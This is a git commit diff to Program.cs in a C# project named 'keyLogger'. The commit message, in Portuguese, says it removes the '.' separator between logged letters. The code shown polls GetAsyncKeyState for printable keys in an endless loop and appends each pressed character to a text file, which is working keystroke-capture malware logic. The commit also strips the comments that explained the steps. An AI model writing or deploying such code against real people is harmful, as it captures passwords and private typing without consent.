684dc8589b1146b13274eb6aeb61600f475ee013
Yuri Matos Rodrigues <yurimatos.tuti@gmail.com>
2020-05-15 23:33:38 -0300

    Ajustando a escrita no arquivo de texto: retirando o '.' como separador de letras.

--- Program.cs
+++ Program.cs
@@ -19,22 +19,16 @@ namespace keyLogger
 
             FCriarArquivo(LStrDirectory, LStrFile);
 
-
-            // 1 - Pegar as teclas digitadas e exibir no console
-
             while (true){
-                //pause and let other programs get  a chance to run
                 Thread.Sleep(5);
 
-                //check all keys for their state
                 for (int LIntCaracter = 32; LIntCaracter < 127; LIntCaracter++) {                    
                     LIntKeyState = GetAsyncKeyState(LIntCaracter);                                                       
 
-                    if (LIntKeyState == 32769) {
-                        // 2 - Jogar as teclas digitadas em uma arquivo de texto            
+                    if (LIntKeyState == 32769) {      
 
                         using (StreamWriter LSw = File.AppendText(LStrFile)) {
-                            LSw.Write((char)LIntCaracter + ". ");                            
+                            LSw.Write((char)LIntCaracter);                            
                         }
                         
                     }
